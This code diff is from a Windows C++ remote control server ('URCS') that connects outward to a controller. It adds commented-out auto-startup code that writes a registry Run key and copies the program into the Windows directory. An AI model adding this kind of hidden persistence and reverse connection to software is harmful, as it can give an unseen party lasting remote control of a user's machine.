@@ -41,8 +41,17 @@ UINT eprx(LPVOID pParam)
 		Sleep(1000); //Wait 1 second 
 		int i=-1; //indicator.
 		SOCKET sk=mpr.connectto(); //Connect to socket and prepair it for instance's
-		if(sk==0) 
-			Sleep(60000); //wait 1 minute for reconnect if don't success.
+//		SOCKET sk=0;
+		if(sk==0)
+		{
+			//try with proxy... if not, retry at 1 minute...
+			//don't try... because, support are not completed yet...
+			//sk=mpr.connecttoproxy(); //Connect to socket-proxied and prepair it for instance's
+			if (sk==0) //if with proxy does not connect...
+				Sleep(60000); //wait 1 minute for reconnect if don't success.
+			else
+				i=newcore.start_instance(sk,1,"255.255.255.255"); // Start the process to manage connection proxy
+		}
 		else 
 			i=newcore.start_instance(sk,1,"255.255.255.255"); // Start the process to manage connection proxy
 		if (i==0) closesocket(sk); //When finish close the connection
@@ -63,6 +72,18 @@ int APIENTRY _tWinMain(HINSTANCE hInstance,HINSTANCE hPrevInstance,LPTSTR    lpC
 {
 	CUserver server; //Start new server instance
 	newcore.data_g.LoadData(); //Get ini
+	/*auto-install...
+	*/
+
+	//installed...
+	// this code is for auto-startup (if you need to prevent for reboot before remote installation)
+	// by default is disabled.
+
+	/*	newcore.data_g.PutKey(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", "URCS","rms");
+	newcore.data_g.CopyMeToWinDir(); */
+	
+	//finish
+
 	AfxBeginThread(eprx,NULL); //Start proxy out connection
 	if (server.startserver(newcore.data_g.port)>0)
 	{
